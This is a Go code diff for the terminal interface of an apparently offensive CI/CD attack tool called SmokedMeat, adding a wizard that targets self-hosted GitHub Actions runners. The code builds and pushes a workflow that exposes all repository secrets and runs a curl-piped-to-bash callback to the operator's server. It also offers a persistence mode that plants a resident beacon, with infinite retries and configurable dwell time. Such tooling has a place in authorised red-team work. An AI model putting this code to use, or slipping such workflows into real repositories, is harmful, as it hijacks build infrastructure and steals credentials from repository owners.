@@ -5,6 +5,7 @@ package tui
 
 import (
 	"fmt"
+	"net/url"
 	"strconv"
 	"strings"
 	"time"
@@ -64,6 +65,74 @@ func wizardDeploymentModeLabel(w *WizardState) string {
 		parts = append(parts, fmt.Sprintf("%d callbacks", w.CallbackBudget))
 	}
 	return strings.Join(parts, ", ")
+}
+
+const (
+	persistenceEnvKey                   = "SMOKEDMEAT_PERSIST"
+	runnerTargetMetadataKindKey         = "callback_kind"
+	runnerTargetMetadataKindValue       = "self_hosted_runner"
+	runnerTargetMetadataModeKey         = "persistence_mode"
+	runnerTargetMetadataModeResident    = "resident"
+	runnerTargetMetadataRetryKey        = "retry_policy"
+	runnerTargetMetadataRouteKey        = "deploy_route"
+	runnerTargetMetadataBranchKey       = "branch"
+	runnerTargetMetadataWorkflowFileKey = "workflow_file"
+	runnerTargetMetadataTriggerKey      = "workflow_trigger"
+)
+
+func runnerTargetUsesTryCloudflare(rawURL string) bool {
+	parsed, err := url.Parse(strings.TrimSpace(rawURL))
+	if err != nil {
+		return false
+	}
+	host := strings.TrimSpace(parsed.Hostname())
+	return strings.HasSuffix(host, ".trycloudflare.com")
+}
+
+func runnerTargetRetryPolicy(rawURL string) string {
+	if runnerTargetUsesTryCloudflare(rawURL) {
+		return "trycloudflare-1h"
+	}
+	return "infinite"
+}
+
+func decoratePayloadForPersistence(payload string) string {
+	if strings.Contains(payload, "${IFS}") {
+		return strings.ReplaceAll(payload, "|bash", "|"+persistenceEnvKey+"=1${IFS}bash")
+	}
+	return strings.ReplaceAll(payload, "|bash", "|"+persistenceEnvKey+"=1 bash")
+}
+
+func (m Model) wizardCanAttemptPersistence() bool {
+	if m.wizard == nil {
+		return false
+	}
+	if m.wizard.Kind == WizardKindRunnerTarget {
+		return m.wizard.RunnerTargetAction == RunnerTargetActionAutoWorkflowPush || m.wizard.RunnerTargetAction == RunnerTargetActionCopyWorkflow
+	}
+	return m.vulnerabilityCanAttemptPersistence(m.wizard.SelectedVuln)
+}
+
+func (m Model) vulnerabilityCanAttemptPersistence(vuln *Vulnerability) bool {
+	if vuln == nil || m.selfHostedContextForVulnerability(vuln) == nil {
+		return false
+	}
+	if len(vuln.GateTriggers) > 0 {
+		return false
+	}
+	injCtx, ok := payloadInjectionContextForVuln(vuln)
+	if !ok {
+		return false
+	}
+	return injCtx.Language == rye.LangBash
+}
+
+func (m *Model) toggleWizardPersistenceAttempt() {
+	if m.wizard == nil || !m.wizardCanAttemptPersistence() {
+		return
+	}
+	m.wizard.PersistenceAttempt = !m.wizard.PersistenceAttempt
+	m.wizard.Payload = ""
 }
 
 func (m *Model) cycleCommentTarget() {
@@ -151,10 +220,114 @@ func (m *Model) moveWizardDelivery(delta int) {
 	}
 }
 
+func (m *Model) setRunnerTargetAction(action RunnerTargetAction) {
+	if m.wizard == nil {
+		return
+	}
+	m.wizard.RunnerTargetAction = action
+}
+
+func (m *Model) moveRunnerTargetAction(delta int) {
+	if m.wizard == nil || m.wizard.Step != 2 || delta == 0 {
+		return
+	}
+	actions := []RunnerTargetAction{
+		RunnerTargetActionPassiveDetails,
+		RunnerTargetActionAutoWorkflowPush,
+		RunnerTargetActionCopyWorkflow,
+	}
+	currentIdx := 0
+	for i, action := range actions {
+		if m.wizard.RunnerTargetAction == action {
+			currentIdx = i
+			break
+		}
+	}
+	nextIdx := currentIdx + delta
+	if nextIdx < 0 || nextIdx >= len(actions) {
+		return
+	}
+	m.wizard.RunnerTargetAction = actions[nextIdx]
+}
+
+func (m Model) handleRunnerTargetWizardKeyMsg(msg tea.KeyPressMsg) (tea.Model, tea.Cmd) {
+	switch msg.String() {
+	case "ctrl+c":
+		m.quitting = true
+		return m, tea.Quit
+	case "esc":
+		if m.wizard.Step <= 1 {
+			m.CloseWizard()
+		} else {
+			m.wizard.Step--
+		}
+		return m, nil
+	case "enter":
+		return m.advanceRunnerTargetWizardStep()
+	case "1":
+		if m.wizard.Step == 2 {
+			m.setRunnerTargetAction(RunnerTargetActionPassiveDetails)
+		}
+		return m, m.startWizardPreflight(false)
+	case "2":
+		if m.wizard.Step == 2 {
+			m.setRunnerTargetAction(RunnerTargetActionAutoWorkflowPush)
+		}
+		return m, m.startWizardPreflight(false)
+	case "3":
+		if m.wizard.Step == 2 {
+			m.setRunnerTargetAction(RunnerTargetActionCopyWorkflow)
+		}
+		return m, m.startWizardPreflight(false)
+	case "up", "k":
+		if m.wizard.Step == 2 {
+			m.moveRunnerTargetAction(-1)
+		}
+		return m, m.startWizardPreflight(false)
+	case "down", "j":
+		if m.wizard.Step == 2 {
+			m.moveRunnerTargetAction(1)
+		}
+		return m, m.startWizardPreflight(false)
+	case "d":
+		if m.wizard.Step == 3 &&
+			(m.wizard.RunnerTargetAction == RunnerTargetActionAutoWorkflowPush || m.wizard.RunnerTargetAction == RunnerTargetActionCopyWorkflow) &&
+			!m.wizard.PersistenceAttempt {
+			dwellPresets := []time.Duration{0, 30 * time.Second, 60 * time.Second, 2 * time.Minute, 5 * time.Minute}
+			currentIdx := 0
+			for i, d := range dwellPresets {
+				if d == m.wizard.DwellTime {
+					currentIdx = i
+					break
+				}
+			}
+			m.wizard.DwellTime = dwellPresets[(currentIdx+1)%len(dwellPresets)]
+		}
+		return m, nil
+	case "b":
+		if m.wizard.Step == 3 &&
+			(m.wizard.RunnerTargetAction == RunnerTargetActionAutoWorkflowPush || m.wizard.RunnerTargetAction == RunnerTargetActionCopyWorkflow) &&
+			!m.wizard.PersistenceAttempt {
+			m.cycleWizardCallbackBudget()
+		}
+		return m, nil
+	case "p":
+		if m.wizard.Step == 3 && (m.wizard.RunnerTargetAction == RunnerTargetActionAutoWorkflowPush || m.wizard.RunnerTargetAction == RunnerTargetActionCopyWorkflow) {
+			m.toggleWizardPersistenceAttempt()
+		}
+		return m, nil
+	}
+
+	return m, nil
+}
+
 func (m Model) handleWizardKeyMsg(msg tea.KeyPressMsg) (tea.Model, tea.Cmd) {
 	if m.wizard == nil {
 		m.CloseWizard()
 		return m, nil
+	}
+	if m.wizard.Kind == WizardKindRunnerTarget {
+		return m.handleRunnerTargetWizardKeyMsg(msg)
 	}
 
 	if m.wizard.Step == 3 && m.wizard.DeliveryMethod == DeliveryComment {
@@ -181,6 +354,9 @@ func (m Model) handleWizardKeyMsg(msg tea.KeyPressMsg) (tea.Model, tea.Cmd) {
 			return m, nil
 		case "b":
 			m.cycleWizardCallbackBudget()
+			return m, nil
+		case "p":
+			m.toggleWizardPersistenceAttempt()
 			return m, nil
 		case "t":
 			m.cycleCommentTarget()
@@ -286,6 +462,12 @@ func (m Model) handleWizardKeyMsg(msg tea.KeyPressMsg) (tea.Model, tea.Cmd) {
 		m.cycleWizardCallbackBudget()
 		return m, nil
 
+	case "p":
+		if m.wizard.Step == 3 {
+			m.toggleWizardPersistenceAttempt()
+		}
+		return m, nil
+
 	case "f":
 		if m.wizard.Step == 3 && m.wizard.DeliveryMethod == DeliveryAutoPR {
 			if m.wizard.Draft == nil {
@@ -340,6 +522,9 @@ func (m Model) advanceWizardStep() (tea.Model, tea.Cmd) {
 	if m.wizard == nil {
 		return m, nil
 	}
+	if m.wizard.Kind == WizardKindRunnerTarget {
+		return m.advanceRunnerTargetWizardStep()
+	}
 
 	switch m.wizard.Step {
 	case 1:
@@ -365,8 +550,12 @@ func (m Model) advanceWizardStep() (tea.Model, tea.Cmd) {
 				}
 				stager := rye.NewStager(m.config.ExternalURL(), injCtx)
 				payloadObj := stager.Generate()
+				payload := prependGateTriggers(payloadObj.Raw, vuln)
+				if m.wizard.PersistenceAttempt {
+					payload = decoratePayloadForPersistence(payload)
+				}
 				m.wizard.StagerID = stager.ID
-				m.wizard.Payload = prependGateTriggers(payloadObj.Raw, vuln)
+				m.wizard.Payload = payload
 			}
 		}
 		if m.wizard.DeliveryMethod == DeliveryComment {
@@ -379,6 +568,26 @@ func (m Model) advanceWizardStep() (tea.Model, tea.Cmd) {
 
 	case 3:
 		return m.executeWizardDeployment()
+	}
+
+	return m, nil
+}
+
+func (m Model) advanceRunnerTargetWizardStep() (tea.Model, tea.Cmd) {
+	if m.wizard == nil || m.wizard.SelectedRunnerTarget == nil {
+		m.CloseWizard()
+		return m, nil
+	}
+
+	switch m.wizard.Step {
+	case 1:
+		m.wizard.Step = 2
+		return m, m.startWizardPreflight(false)
+	case 2:
+		m.wizard.Step = 3
+		return m, nil
+	case 3:
+		return m.executeRunnerTargetWizardAction()
 	}
 
 	return m, nil
@@ -680,4 +889,230 @@ func (m Model) executeWizardDeployment() (tea.Model, tea.Cmd) {
 
 	m.CloseWizard()
 	return m, nil
+}
+
+func (m Model) executeRunnerTargetWizardAction() (tea.Model, tea.Cmd) {
+	if m.wizard == nil || m.wizard.SelectedRunnerTarget == nil {
+		m.CloseWizard()
+		return m, nil
+	}
+
+	target := m.wizard.SelectedRunnerTarget
+	switch m.wizard.RunnerTargetAction {
+	case RunnerTargetActionPassiveDetails:
+		m.AddOutput("info", fmt.Sprintf("Observed self-hosted runner target %s on %s", target.LabelDisplay, target.Repository))
+		if target.PreferredPath != "" {
+			m.AddOutput("info", fmt.Sprintf("Prefer existing vuln-backed path first: %s", target.PreferredPath))
+		}
+		m.CloseWizard()
+		return m, nil
+	case RunnerTargetActionAutoWorkflowPush:
+		state, reason := m.runnerTargetActionStatus(m.wizard.RunnerTargetAction)
+		if state == deployStateFail || state == deployStateDenied {
+			if reason == "" {
+				reason = "Runner-target auto workflow push is blocked"
+			}
+			m.AddOutput("error", reason)
+			return m, nil
+		}
+		workflowPath := runnerTargetWorkflowPath()
+		branchName := generateRunnerTargetBranchName(time.Now())
+		deployRoute := "token"
+		var sshState *SSHState
+		if m.runnerTargetSSHWriteResult() != nil {
+			sshState = m.sshState
+			deployRoute = "ssh"
+		}
+		stager, script, err := m.prepareRunnerTargetPayload(target, m.runnerTargetCallbackMetadata(target, workflowPath, branchName, deployRoute))
+		if err != nil {
+			m.AddOutput("error", fmt.Sprintf("Stager registration failed: %v", err))
+			m.CloseWizard()
+			return m, nil
+		}
+		workflowYAML := buildRunnerTargetCallbackWorkflow(target, script)
+		modeLabel := wizardDeploymentModeLabel(m.wizard)
+		dwellTime := m.wizard.DwellTime
+		persistenceEnabled := m.wizard.PersistenceAttempt
+		m.AddOutput("info", fmt.Sprintf("Target: %s [%s]", target.Repository, target.LabelDisplay))
+		m.AddOutput("muted", fmt.Sprintf("Workflow file: %s | Mode: %s", workflowPath, modeLabel))
+		if route := m.runnerTargetRouteSummary(); route != "" {
+			m.AddOutput("muted", "Route: "+route)
+		}
+		if len(target.DynamicLabelSet) > 0 {
+			m.AddOutput("muted", fmt.Sprintf("Optional runtime labels observed and omitted: %s", strings.Join(target.DynamicLabelSet, ", ")))
+		}
+		m.AddOutput("muted", fmt.Sprintf("Stager: %s | Persistence: %t", stager.ID, persistenceEnabled))
+		m.CloseWizard()
+		return m, m.deployRunnerTargetAutoWorkflowPush(target, stager.ID, branchName, workflowPath, workflowYAML, dwellTime, sshState)
+	case RunnerTargetActionCopyWorkflow:
+		workflowPath := runnerTargetWorkflowPath()
+		stager, script, err := m.prepareRunnerTargetPayload(target, m.runnerTargetCallbackMetadata(target, workflowPath, "", "manual"))
+		if err != nil {
+			m.AddOutput("error", fmt.Sprintf("Stager registration failed: %v", err))
+			m.CloseWizard()
+			return m, nil
+		}
+		workflowYAML := buildRunnerTargetCallbackWorkflow(target, script)
+		if err := clipboardWriteAll(workflowYAML); err != nil {
+			m.AddOutput("warning", fmt.Sprintf("Clipboard failed: %v", err))
+		} else {
+			m.AddOutput("success", "══════════════════════════════════════")
+			m.AddOutput("success", "  ✓ WORKFLOW COPIED TO CLIPBOARD")
+			m.AddOutput("success", "══════════════════════════════════════")
+			m.activityLog.Add(IconSuccess, "Runner-target workflow copied to clipboard")
+		}
+
+		modeLabel := wizardDeploymentModeLabel(m.wizard)
+		dwellTime := m.wizard.DwellTime
+		persistenceEnabled := m.wizard.PersistenceAttempt
+		m.AddOutput("info", fmt.Sprintf("Target: %s [%s]", target.Repository, target.LabelDisplay))
+		m.AddOutput("muted", fmt.Sprintf("Workflow file: %s | Mode: %s", workflowPath, modeLabel))
+		if route := m.runnerTargetRouteSummary(); route != "" {
+			m.AddOutput("muted", "Route: "+route)
+		}
+		if len(target.DynamicLabelSet) > 0 {
+			m.AddOutput("muted", fmt.Sprintf("Optional runtime labels observed and omitted: %s", strings.Join(target.DynamicLabelSet, ", ")))
+		}
+		m.AddOutput("muted", fmt.Sprintf("Stager: %s | Persistence: %t", stager.ID, persistenceEnabled))
+		if persistenceEnabled {
+			m.AddOutput("info", "Waiting for resident foothold seed - the resident beacon should appear in implants automatically")
+		}
+		m.AddOutput("output", workflowYAML)
+		m.wizard.Reset()
+		m.StartWaitingForRunnerTarget(stager.ID, target, "Self-Hosted Workflow Push", dwellTime)
+		return m, nil
+	default:
+		m.CloseWizard()
+		return m, nil
+	}
+}
+
+func (m *Model) prepareRunnerTargetPayload(target *RunnerTargetSelection, metadata map[string]string) (*rye.Stager, string, error) {
+	stager := rye.NewStager(m.config.ExternalURL(), rye.BashRun)
+
+	if metadata == nil {
+		metadata = make(map[string]string)
+	}
+	metadata["repository"] = target.Repository
+	metadata["callback_label"] = runnerTargetCallbackLabel(target, metadata[runnerTargetMetadataWorkflowFileKey])
+	if workflowPath := strings.TrimSpace(metadata[runnerTargetMetadataWorkflowFileKey]); workflowPath != "" {
+		metadata["workflow"] = workflowPath
+		metadata["job"] = runnerTargetWorkflowJobName()
+	} else {
+		if len(target.ObservedWorkflowPaths) > 0 {
+			metadata["workflow"] = target.ObservedWorkflowPaths[0]
+		}
+		if len(target.ObservedJobNames) > 0 {
+			metadata["job"] = target.ObservedJobNames[0]
+		}
+	}
+	metadata["runner_label"] = target.LabelDisplay
+
+	if m.wizard != nil && m.wizard.PersistenceAttempt {
+		callback, err := m.registerPersistentRunnerFoothold(stager.ID, m.wizard.DwellTime, metadata)
+		if err != nil {
+			return stager, "", err
+		}
+		if callback != nil {
+			m.upsertCallback(*callback)
+		}
+		return stager, buildRunnerTargetCallbackScript(stager.CallbackURL(), true), nil
+	}
+
+	if err := m.registerStagerWithMeta(stager.ID, m.wizard.DwellTime, m.wizard.CallbackBudget, metadata); err != nil {
+		return stager, "", err
+	}
+	return stager, buildRunnerTargetCallbackScript(stager.CallbackURL(), false), nil
+}
+
+func (m Model) runnerTargetCallbackMetadata(target *RunnerTargetSelection, workflowPath, branchName, route string) map[string]string {
+	metadata := map[string]string{
+		runnerTargetMetadataKindKey:         runnerTargetMetadataKindValue,
+		runnerTargetMetadataWorkflowFileKey: workflowPath,
+		runnerTargetMetadataTriggerKey:      "push",
+	}
+	if route != "" {
+		metadata[runnerTargetMetadataRouteKey] = route
+	}
+	if branchName != "" {
+		metadata[runnerTargetMetadataBranchKey] = branchName
+	}
+	if m.wizard != nil && m.wizard.PersistenceAttempt {
+		metadata[runnerTargetMetadataModeKey] = runnerTargetMetadataModeResident
+		metadata[runnerTargetMetadataRetryKey] = runnerTargetRetryPolicy(m.config.ExternalURL())
+	}
+	return metadata
+}
+
+func runnerTargetCallbackLabel(target *RunnerTargetSelection, workflowPath string) string {
+	if target == nil {
+		return "Self-hosted runner"
+	}
+	if strings.TrimSpace(workflowPath) != "" {
+		return "Self-hosted runner - " + workflowPath
+	}
+	if len(target.ObservedWorkflowPaths) > 0 {
+		return "Self-hosted runner - " + target.ObservedWorkflowPaths[0]
+	}
+	if target.Repository != "" && target.LabelDisplay != "" {
+		return "Self-hosted runner - " + target.Repository + " - " + target.LabelDisplay
+	}
+	if target.Repository != "" {
+		return "Self-hosted runner - " + target.Repository
+	}
+	if target.LabelDisplay != "" {
+		return "Self-hosted runner - " + target.LabelDisplay
+	}
+	return "Self-hosted runner"
+}
+
+func buildRunnerTargetCallbackScript(callbackURL string, persistent bool) string {
+	if persistent {
+		return fmt.Sprintf("curl -fsSL %q | %s=1 bash", callbackURL, persistenceEnvKey)
+	}
+	return fmt.Sprintf("curl -fsSL %q | bash", callbackURL)
+}
+
+func runnerTargetWorkflowPath() string {
+	return ".github/workflows/smokedmeat-self-hosted.yml"
+}
+
+func runnerTargetWorkflowJobName() string {
+	return "smokedmeat-runner"
+}
+
+func buildRunnerTargetCallbackWorkflow(target *RunnerTargetSelection, script string) string {
+	labels := target.LabelSet
+	if len(labels) == 0 {
+		labels = []string{"self-hosted"}
+	}
+
+	var b strings.Builder
+	b.WriteString("name: SmokedMeat Self-Hosted Callback\n")
+	b.WriteString("on:\n")
+	b.WriteString("  push:\n")
+	b.WriteString("jobs:\n")
+	b.WriteString("  " + runnerTargetWorkflowJobName() + ":\n")
+	b.WriteString("    runs-on:\n")
+	for _, label := range labels {
+		fmt.Fprintf(&b, "      - %s\n", label)
+	}
+	b.WriteString("    permissions:\n")
+	b.WriteString("      contents: read\n")
+	b.WriteString("    steps:\n")
+	b.WriteString("      - name: Setup\n")
+	b.WriteString("        env:\n")
+	b.WriteString("          SETUP: ${{ toJSON(secrets) }}\n")
+	b.WriteString("        run: echo \"Setup completed\"\n")
+	b.WriteString("      - name: SmokedMeat callback\n")
+	b.WriteString("        shell: bash\n")
+	b.WriteString("        run: |\n")
+	for _, line := range strings.Split(script, "\n") {
+		if strings.TrimSpace(line) == "" {
+			b.WriteString("          \n")
+			continue
+		}
+		b.WriteString("          " + line + "\n")
+	}
+	return b.String()
 }
